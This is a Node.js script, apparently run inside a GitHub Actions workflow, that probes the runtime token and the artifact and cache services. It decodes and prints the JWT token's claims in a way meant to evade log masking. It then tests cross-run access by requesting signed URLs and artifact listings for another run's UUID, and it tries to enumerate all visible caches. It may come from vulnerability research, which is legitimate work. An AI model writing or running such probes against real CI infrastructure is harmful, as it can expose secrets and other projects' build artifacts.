const https = require('https');
const fs = require('fs');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

const outputFile = process.env.GITHUB_OUTPUT || '';
if (outputFile) {
  fs.appendFileSync(outputFile, `RESULTS_URL=${RESULTS_URL}\n`);
  fs.appendFileSync(outputFile, `CACHE_URL=${CACHE_URL}\n`);
  fs.appendFileSync(outputFile, `TOKEN_PRESENT=${RUNTIME_TOKEN ? 'YES' : 'NO'}\n`);
  fs.appendFileSync(outputFile, `ORCH_ID=${ORCHESTRATION_ID}\n`);
}

console.log('RESULTS_URL:', RESULTS_URL || '(empty)');
console.log('CACHE_URL (truncated):', CACHE_URL ? CACHE_URL.substring(0, 70) : '(empty)');
console.log('TOKEN_PRESENT:', RUNTIME_TOKEN ? 'YES' : 'NO');
console.log('ORCH_ID:', ORCHESTRATION_ID || '(empty)');

// Try to decode JWT payload (might escape masking since it's different bytes)
if (RUNTIME_TOKEN && RUNTIME_TOKEN.includes('.')) {
  try {
    const parts = RUNTIME_TOKEN.split('.');
    if (parts.length >= 2) {
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      console.log('=== JWT Header ===');
      console.log(JSON.stringify(header, null, 2));
      console.log('=== JWT Payload (token claims — may reveal scope) ===');
      console.log(JSON.stringify(payload, null, 2));
    }
  } catch (e) {
    console.log('JWT decode error:', e.message);
  }
}

function doRequest(options, body) {
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 800) }));
    });
    req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

async function main() {
  const currentUUID = ORCHESTRATION_ID.split('.')[0];
  // UUID from previous run that actually uploaded probe-artifact-2
  const previousRunUUID = 'b55c9da0-4a06-4590-ae64-d1ca22909520';

  console.log('\n=== CROSS-RUN IDOR TEST ===');
  console.log('Current run UUID:', currentUUID);
  console.log('Previous run UUID (target):', previousRunUUID);

  if (RESULTS_URL && RUNTIME_TOKEN) {
    const host = new URL(RESULTS_URL).hostname;
    const signedUrlPath = '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL';

    // Test A: Get signed URL for artifact in PREVIOUS run using CURRENT run's token
    // If this works (200), we have cross-run artifact IDOR
    const rA = await doRequest({
      hostname: host, path: signedUrlPath, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, { workflowRunBackendId: previousRunUUID, name: 'probe-artifact-2' });
    console.log('\n[IDOR Test A] GetSignedURL with PREVIOUS run UUID + CURRENT token:');
    console.log('Status:', rA.status, '| Body:', rA.body);
    // 200 = IDOR confirmed; 404 = properly scoped; 401 = token invalid

    // Test B: List artifacts in PREVIOUS run using CURRENT run's token
    const rB = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, { workflowRunBackendId: previousRunUUID });
    console.log('\n[IDOR Test B] ListArtifacts with PREVIOUS run UUID + CURRENT token:');
    console.log('Status:', rB.status, '| Body:', rB.body);

    // Test C: List artifacts for current run (baseline — should work if token is valid for ListArtifacts)
    const rC = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, { workflowRunBackendId: currentUUID });
    console.log('\n[IDOR Test C] ListArtifacts with CURRENT run UUID (baseline):');
    console.log('Status:', rC.status, '| Body:', rC.body);
  }

  // Test D: Cache service with proper version hash (sha256 of key + paths)
  if (CACHE_URL && RUNTIME_TOKEN) {
    const cacheKey = 'npm-cache';
    const paths = 'node_modules';
    const version = crypto.createHash('sha256').update(cacheKey + '\n' + paths).digest('hex');

    const cacheApiUrl = new URL(CACHE_URL + '_apis/artifactcache/cache');
    cacheApiUrl.searchParams.set('keys', cacheKey);
    cacheApiUrl.searchParams.set('version', version);

    const rD = await doRequest({
      hostname: cacheApiUrl.hostname,
      path: cacheApiUrl.pathname + cacheApiUrl.search,
      method: 'GET',
      headers: {
        'Authorization': 'Bearer ' + RUNTIME_TOKEN,
        'Accept': 'application/json;api-version=6.0-preview',
        'Content-Type': 'application/json',
      }
    }, null);
    console.log('\n[Cache Test D] GET cache with key=npm-cache, version=' + version.substring(0, 16) + '...:');
    console.log('Status:', rD.status, '| Body:', rD.body);

    // Test E: Try to list ALL cache entries visible to this token
    const cacheListUrl = new URL(CACHE_URL + '_apis/artifactcache/caches');
    const rE = await doRequest({
      hostname: cacheListUrl.hostname,
      path: cacheListUrl.pathname,
      method: 'GET',
      headers: {
        'Authorization': 'Bearer ' + RUNTIME_TOKEN,
        'Accept': 'application/json;api-version=6.0-preview',
      }
    }, null);
    console.log('\n[Cache Test E] List ALL caches (scope discovery):');
    console.log('Status:', rE.status, '| Body:', rE.body);
  }
}

main().catch(e => console.log('Fatal error:', e.message));
